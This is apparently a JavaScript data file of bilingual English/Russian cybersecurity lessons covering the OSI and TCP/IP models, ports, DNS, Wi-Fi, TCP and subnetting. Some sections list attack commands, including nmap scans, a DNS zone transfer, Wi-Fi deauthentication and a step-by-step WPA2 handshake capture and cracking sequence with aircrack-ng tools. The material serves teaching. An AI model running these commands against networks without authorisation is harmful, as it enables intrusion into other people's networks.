const fs = require('fs');
const path = require('path');
const https = require('https');

function fetchJson(url) {
  return new Promise((resolve, reject) => {
    const options = { headers: { 'User-Agent': 'CyberLearnPro/1.0 (educational project)' } };
    https.get(url, options, (res) => {
      let data = '';
      res.on('data', chunk => data += chunk);
      res.on('end', () => { try { resolve(JSON.parse(data)); } catch (e) { reject(e); } });
    }).on('error', reject);
  });
}

const handcraftedTopics = [

  // ─── NETWORKING FUNDAMENTALS ───────────────────────────────────────
  {
    id: "osi_model",
    category: "Networking Fundamentals",
    title: "The OSI Model",
    icon: "network",
    sections: [
      { heading: "Overview", body: `The Open Systems Interconnection (OSI) model is a conceptual framework developed by ISO in 1984 that standardizes the functions of a telecommunication or computing system into seven abstraction layers. It allows diverse communication systems to communicate using standard protocols. The model is crucial for network troubleshooting and security because it isolates exactly which layer a problem or attack is occurring at.` },
      { heading: "Layer 1 – Physical Layer", body: `The Physical layer is responsible for the transmission and reception of raw bit streams over a physical medium. It defines the hardware specifications including cables, switches, voltage levels, timing of voltage changes, physical data rates, and connectors. Examples: Ethernet cables (Cat5e, Cat6), fiber optic cables, repeaters, hubs.\n\nSecurity concerns: Physical access attacks, cable tapping, hardware keyloggers, Tempest attacks (intercepting electromagnetic emissions).` },
      { heading: "Layer 2 – Data Link Layer", body: `The Data Link layer provides node-to-node data transfer between two directly connected nodes. It detects and possibly corrects errors from the physical layer. It's subdivided into MAC (Media Access Control) and LLC (Logical Link Control) sublayers. Examples: Ethernet frames, switches, bridges, PPP, Wi-Fi (802.11).\n\nSecurity concerns: ARP Spoofing/Poisoning, MAC flooding attacks (overflowing a switch's CAM table), VLAN hopping, STP attacks.` },
      { heading: "Layer 3 – Network Layer", body: `The Network layer is responsible for logical addressing and routing of packets between hosts across multiple networks. Examples: IP (IPv4/IPv6), ICMP, OSPF, BGP, routers.\n\nSecurity concerns: IP Spoofing, route poisoning, ICMP-based attacks (Ping of Death, Smurf attack), TTL manipulation.` },
      { heading: "Layer 4 – Transport Layer", body: `The Transport layer provides end-to-end communication control and reliability. Key protocols: TCP provides reliable, ordered delivery via a three-way handshake (SYN, SYN-ACK, ACK); UDP is connectionless and faster but unreliable.\n\nSecurity concerns: SYN Flood attacks, TCP Session Hijacking, UDP flooding, Port scanning.` },
      { heading: "Layer 5 – Session Layer", body: `The Session layer manages sessions between applications — it establishes, maintains, and terminates connections. Examples: NetBIOS, RPC, SMB session setup.\n\nSecurity concerns: Session hijacking, Pass-the-hash attacks against NetBIOS/SMB.` },
      { heading: "Layer 6 – Presentation Layer", body: `The Presentation layer is responsible for data translation, encryption, and compression. It ensures data is in a usable format and handles character encoding, compression, and encryption/decryption.\n\nSecurity concerns: SSL stripping attacks, malformed data format injection, character encoding exploits.` },
      { heading: "Layer 7 – Application Layer", body: `The Application layer is the topmost layer and is closest to the end user. Examples: HTTP/HTTPS, FTP, SMTP, DNS, SNMP, Telnet, SSH.\n\nSecurity concerns: SQL Injection, XSS, CSRF, DNS poisoning, HTTP header injection.\n\nMemory Aid: "Please Do Not Throw Sausage Pizza Away" (Physical, Data Link, Network, Transport, Session, Presentation, Application)` }
    ],
    sections_ru: [
      { heading: "Обзор", body: `Модель взаимодействия открытых систем (OSI) — концептуальная структура, разработанная ISO в 1984 году, стандартизирующая функции телекоммуникационных и вычислительных систем на семи уровнях абстракции. Модель позволяет разнородным системам взаимодействовать по стандартным протоколам. Она критически важна для диагностики сети и безопасности, так как позволяет точно определить уровень, на котором возникает проблема или атака.` },
      { heading: "Уровень 1 — Физический", body: `Физический уровень отвечает за передачу и приём потоков битов через физическую среду. Определяет спецификации оборудования: кабели, коммутаторы, уровни напряжения, скорость передачи данных. Примеры: Ethernet-кабели (Cat5e, Cat6), оптоволокно, повторители, концентраторы.\n\nУгрозы безопасности: физический доступ к оборудованию, перехват кабеля, аппаратные кейлоггеры, атаки Tempest (перехват электромагнитного излучения).` },
      { heading: "Уровень 2 — Канальный", body: `Канальный уровень обеспечивает передачу данных между двумя непосредственно соединёнными узлами и обнаруживает ошибки физического уровня. Делится на подуровни MAC и LLC. Примеры: Ethernet-кадры, коммутаторы, мосты, PPP, Wi-Fi (802.11).\n\nУгрозы: ARP-спуфинг/отравление, MAC-флудинг (переполнение CAM-таблицы коммутатора), перепрыгивание между VLAN, атаки на STP.` },
      { heading: "Уровень 3 — Сетевой", body: `Сетевой уровень отвечает за логическую адресацию и маршрутизацию пакетов между хостами через несколько сетей. Примеры: IP (IPv4/IPv6), ICMP, OSPF, BGP, маршрутизаторы.\n\nУгрозы: IP-спуфинг, отравление маршрутов, ICMP-атаки (Ping of Death, атака Смурфа), манипуляция TTL.` },
      { heading: "Уровень 4 — Транспортный", body: `Транспортный уровень обеспечивает сквозное управление соединением и надёжность доставки. Ключевые протоколы: TCP (надёжная доставка с трёхэтапным рукопожатием SYN, SYN-ACK, ACK), UDP (без установления соединения, быстрее, но без гарантий).\n\nУгрозы: SYN-флуд, перехват сессий TCP, UDP-флудинг, сканирование портов.` },
      { heading: "Уровень 5 — Сеансовый", body: `Сеансовый уровень управляет сессиями между приложениями — устанавливает, поддерживает и завершает соединения. Примеры: NetBIOS, RPC, установка сессий SMB.\n\nУгрозы: перехват сессии, атаки Pass-the-Hash против NetBIOS/SMB.` },
      { heading: "Уровень 6 — Представительский", body: `Представительский уровень отвечает за трансляцию данных, шифрование и сжатие. Обеспечивает преобразование форматов данных: кодировка символов, сжатие, шифрование/дешифрование.\n\nУгрозы: снятие SSL (SSL Stripping), внедрение некорректно форматированных данных, эксплуатация кодировок символов.` },
      { heading: "Уровень 7 — Прикладной", body: `Прикладной уровень — верхний, ближайший к пользователю. Примеры: HTTP/HTTPS, FTP, SMTP, DNS, SNMP, Telnet, SSH.\n\nУгрозы: SQL-инъекция, XSS, CSRF, отравление DNS, внедрение заголовков HTTP.\n\nМнемоника: "Пожалуйста Данные Не Трогай, Сессию Представь Аккуратно" (Физический, Канальный, Сетевой, Транспортный, Сеансовый, Представительский, Прикладной)` }
    ]
  },

  {
    id: "common_ports",
    category: "Networking Fundamentals",
    title: "Common Ports & Protocols",
    icon: "network",
    sections: [
      { heading: "Overview", body: `Ports are virtual communication endpoints that allow a single host to run multiple network services simultaneously. Port numbers range from 0 to 65535. They are divided into: Well-Known Ports (0–1023) reserved for standard services, Registered Ports (1024–49151) for user applications, and Dynamic/Private Ports (49152–65535) used for temporary connections.` },
      { heading: "Critical Ports to Know", body: `PORT 20/21 – FTP: Port 21 for control commands, Port 20 for data transfer. Transmits in cleartext.\nPORT 22 – SSH: Encrypted replacement for Telnet. Used for remote login, SCP/SFTP.\nPORT 23 – Telnet: Unencrypted remote administration. Never use on production systems.\nPORT 25 – SMTP: Sends email between servers.\nPORT 53 – DNS: Translates domain names to IPs. Uses UDP for queries, TCP for zone transfers.\nPORT 80 – HTTP: Unencrypted web traffic.\nPORT 110 – POP3: Retrieves email (unencrypted).\nPORT 143 – IMAP: Email access protocol.\nPORT 443 – HTTPS: HTTP over TLS/SSL.\nPORT 445 – SMB: Windows file sharing. Target of WannaCry/EternalBlue.\nPORT 3389 – RDP: Windows remote desktop.\nPORT 3306 – MySQL: Default database port.\nPORT 6667 – IRC: Historically used by botnets for C2.` },
      { heading: "TCP vs UDP", body: `TCP: Connection-oriented, reliable. Uses three-way handshake. Used by HTTP, HTTPS, FTP, SSH, SMTP.\n\nUDP: Connectionless, fast, unreliable. No handshake. Used by DNS, DHCP, VoIP, gaming, video streaming.\n\nSecurity Tip: UDP services are often targeted for amplification DDoS attacks — small spoofed request generates large response directed at victim.` },
      { heading: "Port Scanning with Nmap", body: `• nmap -sS [target]  — TCP SYN (stealth) scan\n• nmap -sT [target]  — Full TCP connect scan\n• nmap -sU [target]  — UDP scan\n• nmap -sV [target]  — Service version detection\n• nmap -O [target]   — OS fingerprinting\n• nmap -A [target]   — Aggressive scan\n• nmap -p- [target]  — Scan all 65535 ports\n• nmap --script vuln [target] — Vulnerability scripts` }
    ],
    sections_ru: [
      { heading: "Обзор", body: `Порты — виртуальные конечные точки связи, позволяющие одному хосту одновременно запускать несколько сетевых служб. Номера портов: 0–65535. Разделены на: Известные порты (0–1023) — для стандартных служб, Зарегистрированные порты (1024–49151) — для пользовательских приложений, Динамические/Частные порты (49152–65535) — для временных соединений.` },
      { heading: "Ключевые порты", body: `ПОРТ 20/21 – FTP: порт 21 для команд, порт 20 для данных. Передача в открытом виде — никогда не используйте без SFTP/FTPS.\nПОРТ 22 – SSH: зашифрованная замена Telnet. Используется для удалённого входа, SCP/SFTP.\nПОРТ 23 – Telnet: незашифрованное удалённое администрирование. Запрещён к использованию на боевых системах.\nПОРТ 25 – SMTP: отправка электронной почты между серверами.\nПОРТ 53 – DNS: преобразование доменных имён в IP. UDP для запросов, TCP для зонных передач.\nПОРТ 80 – HTTP: незашифрованный веб-трафик.\nПОРТ 110 – POP3: получение почты (без шифрования).\nПОРТ 143 – IMAP: протокол доступа к почте.\nПОРТ 443 – HTTPS: HTTP поверх TLS/SSL.\nПОРТ 445 – SMB: общий доступ к файлам Windows. Цель WannaCry/EternalBlue.\nПОРТ 3389 – RDP: удалённый рабочий стол Windows.\nПОРТ 3306 – MySQL: стандартный порт базы данных.\nПОРТ 6667 – IRC: исторически используется ботнетами для командного канала (C2).` },
      { heading: "TCP vs UDP", body: `TCP: с установлением соединения, надёжный. Трёхэтапное рукопожатие. Используется HTTP, HTTPS, FTP, SSH, SMTP.\n\nUDP: без соединения, быстрый, ненадёжный. Без рукопожатия. Используется DNS, DHCP, VoIP, онлайн-игры, видеостриминг.\n\nЗаметка по безопасности: UDP-службы часто используются для усиливающих DDoS-атак — небольшой поддельный запрос генерирует большой ответ, направленный на жертву.` },
      { heading: "Сканирование портов с помощью Nmap", body: `• nmap -sS [цель]  — TCP SYN (скрытое) сканирование\n• nmap -sT [цель]  — Полное TCP-сканирование\n• nmap -sU [цель]  — UDP-сканирование\n• nmap -sV [цель]  — Определение версий сервисов\n• nmap -O [цель]   — Определение ОС\n• nmap -A [цель]   — Агрессивное сканирование\n• nmap -p- [цель]  — Сканирование всех 65535 портов\n• nmap --script vuln [цель] — Скрипты поиска уязвимостей` }
    ]
  },

  {
    id: "dns_attacks",
    category: "Networking Fundamentals",
    title: "DNS & DNS Attacks",
    icon: "network",
    sections: [
      { heading: "How DNS Works", body: `The Domain Name System (DNS) translates human-readable domain names into IP addresses. DNS resolution: 1) Browser checks local cache. 2) Queries Root Name Server. 3) Root NS directs to TLD NS. 4) TLD NS directs to Authoritative NS. 5) Authoritative NS returns IP.\n\nKey DNS records:\n• A – IPv4 address\n• AAAA – IPv6 address\n• MX – Mail server\n• CNAME – Alias\n• TXT – SPF, DKIM, DMARC\n• NS – Name server\n• PTR – Reverse DNS` },
      { heading: "DNS Cache Poisoning", body: `Attacker injects malicious DNS records into a resolver's cache, redirecting users to attacker-controlled servers.\n\nPrevention:\n• DNSSEC — cryptographically signs DNS responses\n• Random source ports and query IDs\n• DNS over HTTPS (DoH) or DNS over TLS (DoT)` },
      { heading: "DNS Amplification Attack", body: `Volumetric DDoS exploiting open DNS resolvers. Attacker sends small queries with spoofed source IP. Resolvers send large responses to victim. Amplification factor 50-100x.\n\nPrevention: Disable open resolvers, rate limiting, BCP38 filtering.` },
      { heading: "DNS Enumeration", body: `• nslookup example.com — Basic DNS query\n• dig example.com ANY — All record types\n• dig axfr example.com @ns1.example.com — Zone transfer\n• dnsenum, fierce, dnsrecon — Automated enumeration\n• subfinder, amass — Subdomain discovery` }
    ],
    sections_ru: [
      { heading: "Как работает DNS", body: `Система доменных имён (DNS) переводит человекочитаемые доменные имена в IP-адреса. Процесс разрешения: 1) Браузер проверяет локальный кэш. 2) Запрос к корневому NS. 3) Корневой NS перенаправляет к NS TLD. 4) NS TLD — к авторитативному NS. 5) Авторитативный NS возвращает IP.\n\nОсновные типы записей DNS:\n• A – адрес IPv4\n• AAAA – адрес IPv6\n• MX – почтовый сервер\n• CNAME – псевдоним\n• TXT – SPF, DKIM, DMARC\n• NS – сервер имён\n• PTR – обратный DNS` },
      { heading: "Отравление кэша DNS", body: `Злоумышленник внедряет вредоносные DNS-записи в кэш резолвера, перенаправляя пользователей на подконтрольные серверы.\n\nЗащита:\n• DNSSEC — криптографически подписывает DNS-ответы\n• Случайные исходные порты и идентификаторы запросов\n• DNS через HTTPS (DoH) или DNS через TLS (DoT)` },
      { heading: "Усиливающая атака через DNS", body: `Объёмная DDoS-атака с использованием открытых DNS-резолверов. Злоумышленник отправляет небольшие запросы с поддельным IP-адресом источника. Резолверы отправляют большие ответы жертве. Коэффициент усиления 50–100x.\n\nЗащита: отключение открытых резолверов, ограничение частоты запросов, фильтрация BCP38.` },
      { heading: "Перечисление DNS", body: `• nslookup example.com — Базовый DNS-запрос\n• dig example.com ANY — Все типы записей\n• dig axfr example.com @ns1.example.com — Зонная передача\n• dnsenum, fierce, dnsrecon — Автоматическое перечисление\n• subfinder, amass — Поиск поддоменов` }
    ]
  },

  {
    id: "wireless_security",
    category: "Networking Fundamentals",
    title: "Wireless Security (Wi-Fi)",
    icon: "network",
    sections: [
      { heading: "Wi-Fi Security Standards", body: `WEP (1997): RC4-шифр, полностью взломан. Поддается взлому за минуты через aircrack-ng.\nWPA (2003): TKIP — также уязвим.\nWPA2 (2004): AES-CCMP. Текущий стандарт. Уязвим к KRACK и атакам на PSK.\nWPA3 (2018): SAE вместо PSK. Прямая секретность. Устойчив к офлайн-атакам по словарю.` },
      { heading: "Wi-Fi Attack Techniques", body: `Evil Twin: Rogue AP with same SSID. Tools: hostapd-wpe, airbase-ng.\n\nDeauthentication: Forged 802.11 deauth frames force clients to reconnect.\naireplay-ng -0 [count] -a [BSSID] [interface]\n\nWPA2 Handshake Capture:\n1. airmon-ng start wlan0\n2. airodump-ng wlan0mon\n3. airodump-ng -c [ch] --bssid [AP] -w capture wlan0mon\n4. aireplay-ng -0 1 -a [BSSID] wlan0mon\n5. aircrack-ng -w wordlist.txt capture.cap\n\nPMKID Attack (2018): Single EAPOL frame, no full handshake needed.\nWPS PIN Attack: Tool: Reaver, Bully (~11,000 attempts).` }
    ],
    sections_ru: [
      { heading: "Стандарты безопасности Wi-Fi", body: `WEP (1997): шифр RC4, полностью взломан. Поддаётся взлому за минуты с помощью aircrack-ng.\nWPA (2003): протокол TKIP — также уязвим.\nWPA2 (2004): AES-CCMP — текущий стандарт. Уязвим к KRACK и офлайн-атакам на PSK.\nWPA3 (2018): SAE вместо PSK. Прямая секретность (Forward Secrecy). Устойчив к офлайн-атакам по словарю.` },
      { heading: "Техники атак на Wi-Fi", body: `Злой двойник (Evil Twin): мошенническая точка доступа с тем же SSID. Инструменты: hostapd-wpe, airbase-ng.\n\nДеаутентификация: Поддельные фреймы 802.11 deauth вынуждают клиентов переподключаться.\naireplay-ng -0 [кол-во] -a [BSSID] [интерфейс]\n\nЗахват рукопожатия WPA2:\n1. airmon-ng start wlan0\n2. airodump-ng wlan0mon\n3. airodump-ng -c [канал] --bssid [AP] -w capture wlan0mon\n4. aireplay-ng -0 1 -a [BSSID] wlan0mon\n5. aircrack-ng -w wordlist.txt capture.cap\n\nАтака PMKID (2018): одного кадра EAPOL достаточно, полное рукопожатие не нужно.\nАтака на PIN WPS: инструменты Reaver, Bully (~11 000 попыток).` }
    ]
  },

  {
    id: "tcp_ip_model",
    category: "Networking Fundamentals",
    title: "The TCP/IP Model",
    icon: "network",
    sections: [
      { heading: "Overview", body: "The TCP/IP (Transmission Control Protocol / Internet Protocol) model is the practical, protocol-based networking framework on which the modern Internet runs. It was developed by DARPA for ARPANET in the 1970s and formally described in RFC 1122 and RFC 1123. Unlike the theoretical OSI model, TCP/IP was built from working protocols first, and the model was written to describe them. It defines how data is addressed, transmitted, routed, and received across interconnected networks." },
      { heading: "The Four Layers", body: "1. Application Layer (maps to OSI layers 5-7) — the interface closest to the user. Protocols: HTTP/HTTPS, FTP, SMTP, POP3, IMAP, DNS, SSH, Telnet, SNMP. Data unit: Data.\n2. Transport Layer (OSI layer 4) — end-to-end communication and reliability. Protocols: TCP (reliable, connection-oriented), UDP (fast, connectionless). Data unit: Segment (TCP) / Datagram (UDP).\n3. Internet Layer (OSI layer 3) — logical addressing and routing between networks. Protocols: IPv4, IPv6, ICMP, ARP (glue), OSPF/BGP. Data unit: Packet.\n4. Network Access / Link Layer (OSI layers 1-2) — physical transmission and local delivery. Technologies: Ethernet, Wi-Fi (802.11), ARP, PPP, MAC addressing. Data unit: Frame / Bits." },
      { heading: "TCP/IP vs OSI Mapping", body: "Application       <-> Application, Presentation, Session (OSI 7, 6, 5)\nTransport         <-> Transport (OSI 4)\nInternet          <-> Network (OSI 3)\nNetwork Access    <-> Data Link, Physical (OSI 2, 1)\n\nSome references split Network Access into Data Link + Physical, producing a five-layer TCP/IP model. The four-layer form (RFC 1122) is canonical.\n\nMemory aids — OSI (top-down): All People Seem To Need Data Processing. TCP/IP (top-down): All Internet Traffic Needs Access." },
      { heading: "Data Encapsulation", body: "As data moves down the stack, each layer adds its own header (and the link layer a trailer):\n\nApplication data -> Transport adds TCP/UDP header = Segment -> Internet adds IP header = Packet -> Link adds Ethernet header/trailer = Frame -> Physical converts to Bits.\n\nOn receipt the process reverses (de-encapsulation). Each PDU (Protocol Data Unit) has a different name per layer: Data, Segment, Packet, Frame, Bits." },
      { heading: "TCP/IP vs OSI", body: "TCP/IP: practical, protocol-based, 4 layers, developed before OSI, what the Internet actually uses.\nOSI: theoretical reference model, 7 layers, vendor-neutral, used for teaching and troubleshooting.\n\nSecurity tip: attackers and defenders both reason about layers. A MAC flood is a Layer 2 attack; IP spoofing is Layer 3; a SYN flood is Layer 4; SQL injection is Layer 7." }
    ],
    sections_ru: [
      { heading: "Обзор", body: "Модель TCP/IP (Transmission Control Protocol / Internet Protocol) — практическая, основанная на протоколах сетевая модель, на которой работает современный Интернет. Разработана DARPA для ARPANET в 1970-х годах и формально описана в RFC 1122 и RFC 1123. В отличие от теоретической модели OSI, TCP/IP создавалась от работающих протоколов, а модель была написана для их описания." },
      { heading: "Четыре уровня", body: "1. Прикладной уровень (соответствует уровням OSI 5–7) — интерфейс, ближайший к пользователю. Протоколы: HTTP/HTTPS, FTP, SMTP, POP3, IMAP, DNS, SSH, Telnet, SNMP. Единица данных: Данные.\n2. Транспортный уровень (уровень OSI 4) — сквозная связь и надёжность. Протоколы: TCP (надёжный, с соединением), UDP (быстрый, без соединения). Единица данных: Сегмент (TCP) / Датаграмма (UDP).\n3. Межсетевой уровень (уровень OSI 3) — логическая адресация и маршрутизация между сетями. Протоколы: IPv4, IPv6, ICMP, ARP, OSPF/BGP. Единица данных: Пакет.\n4. Уровень доступа к сети / канальный (уровни OSI 1–2) — физическая передача и локальная доставка. Технологии: Ethernet, Wi-Fi (802.11), ARP, PPP, MAC-адресация. Единица данных: Кадр / Биты." },
      { heading: "Соответствие TCP/IP и OSI", body: "Прикладной        <-> Прикладной, Представительский, Сеансовый (OSI 7, 6, 5)\nТранспортный      <-> Транспортный (OSI 4)\nМежсетевой        <-> Сетевой (OSI 3)\nДоступ к сети     <-> Канальный, Физический (OSI 2, 1)\n\nНекоторые источники разделяют уровень доступа к сети на канальный и физический, получая пятиуровневую модель TCP/IP. Канонической считается четырёхуровневая (RFC 1122).\n\nМнемоника — OSI (сверху вниз): «Пожалуйста Данные Не Трогай, Сессию Представь Аккуратно». Сетевое взаимодействие начинается на прикладном уровне." },
      { heading: "Инкапсуляция данных", body: "При движении данных вниз по стеку каждый уровень добавляет свой заголовок (а канальный — ещё и трейлер):\n\nДанные приложения -> Транспортный добавляет заголовок TCP/UDP = Сегмент -> Межсетевой добавляет заголовок IP = Пакет -> Канальный добавляет заголовок/трейлер Ethernet = Кадр -> Физический преобразует в Биты.\n\nПри приёме процесс идёт в обратном порядке (декапсуляция). Единица данных протокола (PDU) имеет разное имя на каждом уровне: Данные, Сегмент, Пакет, Кадр, Биты." },
      { heading: "TCP/IP и OSI", body: "TCP/IP: практическая, основанная на протоколах, 4 уровня, создана раньше OSI, реально используется в Интернете.\nOSI: теоретическая эталонная модель, 7 уровней, независима от производителей, применяется для обучения и диагностики.\n\nЗаметка по безопасности: и атакующие, и защитники рассуждают по уровням. MAC-флудинг — атака уровня 2; IP-спуфинг — уровня 3; SYN-флуд — уровня 4; SQL-инъекция — уровня 7." }
    ]
  },
  {
    id: "tcp_deep_dive",
    category: "Networking Fundamentals",
    title: "TCP Protocol — Deep Dive",
    icon: "network",
    sections: [
      { heading: "Overview", body: "Transmission Control Protocol (TCP), defined in RFC 793 and updated by RFC 9293, is a connection-oriented, reliable, ordered, full-duplex transport protocol. It breaks data into segments, guarantees delivery via acknowledgments and retransmission, and controls the sending rate. Most of the web (HTTP/HTTPS), email (SMTP/IMAP), and file transfer (FTP/SFTP) run over TCP." },
      { heading: "TCP Header", body: "A TCP header is at least 20 bytes:\n• Source Port / Destination Port (16 bits each)\n• Sequence Number (32 bits) — position of the first data byte in the stream\n• Acknowledgment Number (32 bits) — next byte the sender expects\n• Data Offset, Reserved, Flags\n• Flags: URG, ACK, PSH, RST, SYN, FIN\n• Window Size (16 bits) — flow control / receive buffer\n• Checksum, Urgent Pointer, Options (MSS, SACK, Window Scaling)" },
      { heading: "Three-Way Handshake", body: "1. Client -> Server: SYN (seq=x). Client enters SYN-SENT.\n2. Server -> Client: SYN-ACK (seq=y, ack=x+1). Server enters SYN-RECEIVED.\n3. Client -> Server: ACK (ack=y+1). Both enter ESTABLISHED.\n\nThe handshake synchronizes sequence numbers and confirms both sides are reachable. A half-open connection (SYN received but no final ACK) is the basis of the SYN flood DoS attack." },
      { heading: "Connection Termination", body: "TCP closes with a four-way FIN exchange:\n1. FIN -> 2. ACK -> 3. FIN -> 4. ACK.\nThe side sending the first FIN enters TIME_WAIT (typically 2x MSL) to absorb stray packets. A RST (reset) flag aborts a connection immediately — useful for cleanup, abused for RST injection attacks." },
      { heading: "Reliability & Flow Control", body: "• Sequence & Acknowledgment numbers track every byte.\n• Cumulative ACKs confirm all data up to a point.\n• Retransmission Timeout (RTO) and fast retransmit recover lost segments.\n• Sliding Window lets the receiver advertise how much data it can buffer.\n• Window Scaling (RFC 7323) allows windows larger than 64 KB." },
      { heading: "Congestion Control", body: "TCP adapts to network congestion:\n• Slow Start — window grows exponentially.\n• Congestion Avoidance — grows linearly after the threshold (ssthresh).\n• Fast Retransmit / Fast Recovery — react to 3 duplicate ACKs without waiting for a timeout.\nModern algorithms: CUBIC (Linux default), BBR (Google), Reno, NewReno, Vegas." },
      { heading: "Common Attacks", body: "• SYN Flood: exhaust the connection table with half-open connections.\n• TCP Session Hijacking: inject into an established session.\n• TCP Reset (RST) Injection: forge RST packets to tear down connections.\n• Port Scanning: use handshake behavior (SYN, ACK, FIN) to map open ports.\nDefense: SYN cookies, randomized ISNs, encrypted protocols (TLS), stateful firewalls/IDS." }
    ],
    sections_ru: [
      { heading: "Обзор", body: "Transmission Control Protocol (TCP), определённый в RFC 793 и обновлённый в RFC 9293, — транспортный протокол с установлением соединения, обеспечивающий надёжную, упорядоченную и полнодуплексную передачу. Он разбивает данные на сегменты, гарантирует доставку через подтверждения и повторную передачу, управляет скоростью отправки. Большая часть веба (HTTP/HTTPS), почты (SMTP/IMAP) и передачи файлов (FTP/SFTP) работает поверх TCP." },
      { heading: "Заголовок TCP", body: "Заголовок TCP — минимум 20 байт:\n• Порт источника / Порт назначения (по 16 бит)\n• Порядковый номер (32 бита) — позиция первого байта данных в потоке\n• Номер подтверждения (32 бита) — следующий ожидаемый байт\n• Смещение данных, зарезервировано, флаги\n• Флаги: URG, ACK, PSH, RST, SYN, FIN\n• Размер окна (16 бит) — управление потоком / буфер приёма\n• Контрольная сумма, указатель срочности, параметры (MSS, SACK, масштабирование окна)" },
      { heading: "Трёхэтапное рукопожатие", body: "1. Клиент -> Сервер: SYN (seq=x). Клиент переходит в SYN-SENT.\n2. Сервер -> Клиент: SYN-ACK (seq=y, ack=x+1). Сервер переходит в SYN-RECEIVED.\n3. Клиент -> Сервер: ACK (ack=y+1). Обе стороны в ESTABLISHED.\n\nРукопожатие синхронизирует порядковые номера и подтверждает достижимость обеих сторон. Полуоткрытое соединение (SYN получен, но финального ACK нет) лежит в основе DoS-атаки SYN-флуд." },
      { heading: "Завершение соединения", body: "TCP закрывается четырёхэтапным обменом FIN:\n1. FIN -> 2. ACK -> 3. FIN -> 4. ACK.\nСторона, отправившая первый FIN, переходит в состояние TIME_WAIT (обычно 2x MSL), чтобы поглотить запоздавшие пакеты. Флаг RST (сброс) немедленно прерывает соединение — полезен для очистки, но используется в атаках RST-инъекции." },
      { heading: "Надёжность и управление потоком", body: "• Порядковые номера и номера подтверждения отслеживают каждый байт.\n• Кумулятивные ACK подтверждают все данные до определённой точки.\n• Тайм-аут повторной передачи (RTO) и быстрая повторная передача восстанавливают потерянные сегменты.\n• Скользящее окно позволяет получателю объявлять доступный объём буфера.\n• Масштабирование окна (RFC 7323) допускает окна больше 64 КБ." },
      { heading: "Управление перегрузкой", body: "TCP адаптируется к перегрузке сети:\n• Медленный старт — окно растёт экспоненциально.\n• Предотвращение перегрузки — линейный рост после порога (ssthresh).\n• Быстрая повторная передача / быстрое восстановление — реакция на 3 дублирующих ACK без ожидания тайм-аута.\nСовременные алгоритмы: CUBIC (по умолчанию в Linux), BBR (Google), Reno, NewReno, Vegas." },
      { heading: "Распространённые атаки", body: "• SYN-флуд: исчерпание таблицы соединений полуоткрытыми соединениями.\n• Перехват TCP-сессии: внедрение в установленную сессию.\n• RST-инъекция: подделка пакетов RST для разрыва соединений.\n• Сканирование портов: анализ поведения рукопожатия (SYN, ACK, FIN) для картографирования портов.\nЗащита: SYN cookies, случайные ISN, шифрованные протоколы (TLS), stateful-брандмауэры/IDS." }
    ]
  },
  {
    id: "ip_addressing",
    category: "Networking Fundamentals",
    title: "IPv4 Addressing & Subnetting",
    icon: "network",
    sections: [
      { heading: "Overview", body: "An IPv4 address is a 32-bit logical identifier written in dotted-decimal form (four octets, 0-255), e.g. 192.168.1.10. Each address is split into a network portion and a host portion. IP is a connectionless, best-effort protocol at OSI Layer 3 — delivery is not guaranteed, which is why TCP sits above it." },
      { heading: "Address Classes", body: "Class A: 1.0.0.0 - 126.255.255.255 (default /8)\nClass B: 128.0.0.0 - 191.255.255.255 (/16)\nClass C: 192.0.0.0 - 223.255.255.255 (/24)\nClass D: 224.0.0.0 - 239.255.255.255 (multicast)\nClass E: 240.0.0.0 - 255.255.255.255 (experimental/reserved)\nModern networks use classless CIDR instead of these legacy classes." },
      { heading: "Private & Special Ranges", body: "RFC 1918 private ranges (not routed on the public Internet):\n• 10.0.0.0/8 (10.0.0.0 - 10.255.255.255)\n• 172.16.0.0/12 (172.16.0.0 - 172.31.255.255)\n• 192.168.0.0/16 (192.168.0.0 - 192.168.255.255)\n\nSpecial:\n• 127.0.0.0/8 — loopback (localhost)\n• 169.254.0.0/16 — APIPA / link-local\n• 100.64.0.0/10 — Carrier-Grade NAT (RFC 6598)\n• 224.0.0.0/4 — multicast; 255.255.255.255 — limited broadcast" },
      { heading: "Subnet Mask & CIDR", body: "A subnet mask is a 32-bit value of contiguous 1s (network) followed by 0s (host). CIDR notation writes the count of network bits after a slash: /24 = 255.255.255.0.\n\nNetwork address = IP AND mask (all host bits 0).\nBroadcast address = all host bits 1 (last address).\nUsable hosts = 2^(32 - prefix) - 2\n\nExample: 192.168.1.0/24 -> network .0, broadcast .255, usable .1 - .254 (254 hosts)." },
      { heading: "Common Subnet Sizes", body: "/24 = 255.255.255.0 — 256 addresses, 254 usable\n/25 = 255.255.255.128 — 128, 126 usable\n/26 = 255.255.255.192 — 64, 62 usable\n/27 = 255.255.255.224 — 32, 30 usable\n/28 = 255.255.255.240 — 16, 14 usable\n/29 = 255.255.255.248 — 8, 6 usable\n/30 = 255.255.255.252 — 4, 2 usable (point-to-point links)\n/31 (RFC 3021) = 2 addresses on point-to-point; /32 = single host route." },
      { heading: "Subnetting & VLSM", body: "Subnetting borrows bits from the host portion to create smaller networks. Dividing 192.168.1.0/24 into four /26 subnets:\n192.168.1.0/26 (.1-.62), 192.168.1.64/26 (.65-.126), 192.168.1.128/26 (.129-.190), 192.168.1.192/26 (.193-.254).\nVLSM (Variable Length Subnet Masking) uses different prefix sizes per subnet to avoid wasting addresses." },
      { heading: "Security Relevance", body: "• IP spoofing relies on the fact that IPv4 source addresses are not authenticated.\n• Subnetting and segmentation limit lateral movement and shrink broadcast domains.\n• Private addressing + NAT hides internal topology.\n• Tools: ping, traceroute, ipcalc, subnet calculators to plan networks." }
    ],
    sections_ru: [
      { heading: "Обзор", body: "IPv4-адрес — 32-битный логический идентификатор, записываемый в десятичной форме с точками (четыре октета, 0–255), например 192.168.1.10. Каждый адрес делится на часть сети и часть узла. IP — протокол без соединения, с доставкой «по возможности» (best-effort) на уровне OSI 3 — доставка не гарантируется, поэтому над ним работает TCP." },
      { heading: "Классы адресов", body: "Класс A: 1.0.0.0 - 126.255.255.255 (по умолчанию /8)\nКласс B: 128.0.0.0 - 191.255.255.255 (/16)\nКласс C: 192.0.0.0 - 223.255.255.255 (/24)\nКласс D: 224.0.0.0 - 239.255.255.255 (многоадресная рассылка)\nКласс E: 240.0.0.0 - 255.255.255.255 (экспериментальный/зарезервированный)\nСовременные сети используют бесклассовую адресацию CIDR вместо этих устаревших классов." },
